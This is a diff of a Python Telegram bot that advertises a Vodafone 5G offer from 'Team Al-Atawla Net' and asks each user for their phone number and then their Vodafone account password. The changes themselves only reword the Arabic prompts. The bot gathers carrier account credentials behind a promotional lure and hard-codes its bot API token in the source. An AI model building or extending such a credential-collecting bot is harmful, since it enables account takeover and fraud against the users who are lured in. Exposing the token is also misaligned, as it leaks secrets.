@@ -3,7 +3,6 @@ import requests
 import time
 import json
 import re
-from telebot import types
 
 bot = telebot.TeleBot('7823158391:AAHsuGiNw_tGx6OKCR7KlySXjulT2soxCFE')
 
@@ -28,26 +27,27 @@ def start(message):
 
 🔻 اشترك من الزر التالي ثم أعد إرسال /start ✅""", reply_markup=markup)
         return
-
+    chat_id = message.chat.id
     if chat_id not in started_users:
         started_users.add(chat_id)
         current_state[chat_id] = PHONE
-        msg = bot.send_message(chat_id, """🔥 تيم العتاولة نت
-🎁 عرض الـ 5G من فودافون
-
-📱 من فضلك أرسل رقم هاتفك:""")
+        msg = bot.send_message(chat_id, """تيم العتاولة نت 🔥
+عرض ال5G فودافون
+قم بإرسال رقم هاتفك""")
         bot.register_next_step_handler(msg, process_phone_step)
 
 def process_phone_step(message):
     chat_id = message.chat.id
     if len(message.text) != 11 or not message.text.isdigit():
-        msg = bot.send_message(chat_id, "❌ رقم غير صالح، أعد إدخال رقمك المكون من 11 رقم:")
+        msg = bot.send_message(chat_id, """تيم العتاولة نت 🔥
+عرض ال5G فودافون
+قم بإرسال رقم هاتفك""")
         bot.register_next_step_handler(msg, process_phone_step)
         return
     current_state[chat_id] = PASSWORD
     phone_number = message.text
     current_state['nu'] = phone_number
-    msg = bot.send_message(chat_id, "🔐 الآن أرسل كلمة مرور حسابك في فودافون:")
+    msg = bot.send_message(chat_id, "قم بإدخال كلمة مرور حسابك في فودافون")
     bot.register_next_step_handler(msg, process_password_step)
 
 def process_password_step(message):
